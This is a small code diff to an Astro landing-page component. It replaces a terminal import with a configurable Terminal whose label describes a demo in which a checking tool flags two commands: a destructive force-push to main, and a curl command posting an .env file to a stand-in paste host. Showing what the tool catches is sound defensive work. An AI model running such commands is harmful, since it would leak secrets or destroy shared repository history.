@@ -5,7 +5,7 @@
 //
 // Keep on each Starlight upgrade: the <h1>'s id and data-page-title, and
 // the shape of `data.hero`.
-import LandingTerminal from './LandingTerminal.astro';
+import Terminal from './Terminal.astro';
 
 // Starlight's PAGE_TITLE_ID, which it does not export.
 const PAGE_TITLE_ID = '_top';
@@ -32,7 +32,12 @@ const { title = data.title, tagline, actions = [] } = data.hero || {};
 		}
 	</div>
 	<div class="term-area">
-		<LandingTerminal />
+		<Terminal
+			tape="landing"
+			title="~/shop"
+			label="decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak"
+			compact
+		/>
 	</div>
 </section>
 
